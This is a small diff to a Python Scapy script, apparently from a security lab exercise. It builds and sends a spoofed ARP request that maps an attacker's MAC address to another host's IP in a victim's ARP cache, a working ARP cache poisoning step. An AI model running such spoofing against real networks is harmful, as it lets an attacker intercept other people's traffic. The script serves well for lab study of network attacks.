@@ -11,7 +11,7 @@ A-02:42:0a:09:00:05 IP: 10.9.0.5
 
 E=Ether()
 ## Arp sent from M to A, mapping M's MAC to B's address in A's ARP cache
-A=ARP(hwsrc='02:42:0a:09:00:69', psrc ='10.9.0.6', hwdst= '02:42:0a:09:00:05', pdst='10.9.0.5' )
+A=ARP(hwsrc='02:42:0a:09:00:69', psrc ='10.9.0.6',op=1, hwdst= '02:42:0a:09:00:05', pdst='10.9.0.5' )
 
 pkt = E/A
 sendp(pkt, iface='eth0')
